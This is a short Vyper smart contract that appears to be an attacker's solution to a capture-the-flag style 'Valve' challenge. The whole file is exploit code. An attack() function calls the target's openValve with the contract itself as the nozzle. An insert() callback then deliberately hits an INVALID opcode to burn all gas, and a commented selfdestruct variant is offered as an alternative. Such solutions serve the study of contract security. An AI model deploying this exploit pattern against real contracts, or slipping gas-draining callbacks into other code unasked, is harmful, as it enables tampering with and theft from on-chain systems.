# @version ^0.3.7

interface IValve:
    def open() -> bool: view
    def openValve(nozzle: address): nonpayable

owner: immutable(address)

valve: IValve

@external
@payable
def __init__(_valve: address):
    owner = msg.sender
    self.valve = IValve(_valve)

@external
def attack():
    assert msg.sender == owner, "!owner"
    self.valve.openValve(self)
    assert self.valve.open(), "!opened"

@external
def insert() -> bool:
    # results in INVALID opcode, consumes all gas
    UNREACHABLE: String[11] = "unreachable"
    x: uint256 = 3
    assert 2 > x, UNREACHABLE

    return empty(bool)

    # selfdestruct is being depracated but this solution works as well
    # if msg.sender != empty(address):
        #selfdestruct(self)
    #else:
        #return empty(bool)
